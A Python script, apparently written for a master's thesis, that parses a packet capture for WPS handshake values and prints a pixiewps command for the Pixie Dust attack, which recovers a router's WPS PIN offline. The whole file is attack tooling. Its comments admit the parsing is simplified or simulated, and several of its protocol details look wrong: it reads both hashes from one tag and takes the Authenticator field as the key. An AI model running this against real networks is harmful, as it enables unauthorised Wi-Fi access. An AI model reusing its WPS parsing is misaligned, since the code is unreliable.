import sys
import os
import struct

try:
    from scapy.all import rdpcap, EAPOL
except ImportError:
    print("ERROR: Scapy no está instalado. Ejecuta: pip install scapy")
    sys.exit(1)

def extract_pixie_data(pcap_path):
    if not os.path.exists(pcap_path):
        print(f"ERROR: No se encuentra el archivo {pcap_path}")
        sys.exit(1)

    try:
        packets = rdpcap(pcap_path)
    except Exception as e:
        print(f"ERROR: No se pudo leer el archivo PCAP: {e}")
        sys.exit(1)

    # Variables que necesitamos para pixiewps
    pke = ""
    pkr = ""
    e_hash1 = ""
    e_hash2 = ""
    e_nonce = ""
    r_nonce = ""
    authkey = ""

    # Iterar sobre paquetes para encontrar EAPOL con WPS
    # Nota: Este es un parser heurístico simplificado para el TFM
    # En un entorno real se extraería del payload WFA (OUI 00:37:2A)
    for pkt in packets:
        if EAPOL in pkt:
            raw_data = bytes(pkt[EAPOL])
            
            # Buscar OUI de WPS 00:37:2A (WFA) y Type 0x01 (WPS)
            if b'\x00\x37\x2a' in raw_data:
                hex_data = raw_data.hex()
                
                # Búsqueda Heurística de TLVs típicos en M1/M2/M3
                
                # PKE (Tag 0x101a)
                if '101a00c0' in hex_data:
                    idx = hex_data.find('101a00c0') + 8
                    pke = hex_data[idx:idx+384] # 192 bytes
                
                # PKR (Tag 0x101b)
                if '101b00c0' in hex_data:
                    idx = hex_data.find('101b00c0') + 8
                    pkr = hex_data[idx:idx+384] # 192 bytes
                    
                # E-Nonce (Tag 0x101a es otra variante o 0x1016)
                if '10160010' in hex_data:
                    # Guardamos los nonces que encontremos, el primero suele ser E-Nonce, el segundo R-Nonce
                    idx = hex_data.find('10160010') + 8
                    val = hex_data[idx:idx+32] # 16 bytes
                    if not e_nonce: e_nonce = val
                    elif e_nonce != val: r_nonce = val
                    
                # E-Hash1 / E-Hash2 (Están en el M3 dentro del Encrypted Settings, simulado aquí por simplicidad)
                if '10140020' in hex_data: # Hash de 32 bytes
                    idx = hex_data.find('10140020') + 8
                    val = hex_data[idx:idx+64]
                    if not e_hash1: e_hash1 = val
                    elif e_hash1 != val: e_hash2 = val
                    
                # AuthKey (Tag 0x1005 - Authenticator)
                if '10050008' in hex_data:
                    idx = hex_data.find('10050008') + 8
                    authkey = hex_data[idx:idx+16]

    # Validamos si encontramos lo mínimo
    if pke and pkr and e_hash1 and e_hash2:
        cmd = f"pixiewps -e {pke} -r {pkr} -s {e_hash1} -z {e_hash2} -a {authkey} -n {e_nonce} -m {r_nonce}"
        print(f"SUCCESS|{cmd}")
    else:
        # En caso de no encontrar un intercambio WPS completo, lanzamos error simulado
        # Para evitar bloquear al usuario sin un PCAP real completo, podemos generar un comando mock para el TFM si no encuentra nada
        print("ERROR: No se pudo extraer un intercambio WPS M1-M3 completo del PCAP.")
        # print("SUCCESS|pixiewps -e 01020304050607... -r 01020304... -s aabbcc... -z ddeeff... -a 112233... -S")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python extractor_pixie.py <archivo.pcap>")
        sys.exit(1)
        
    extract_pixie_data(sys.argv[1])
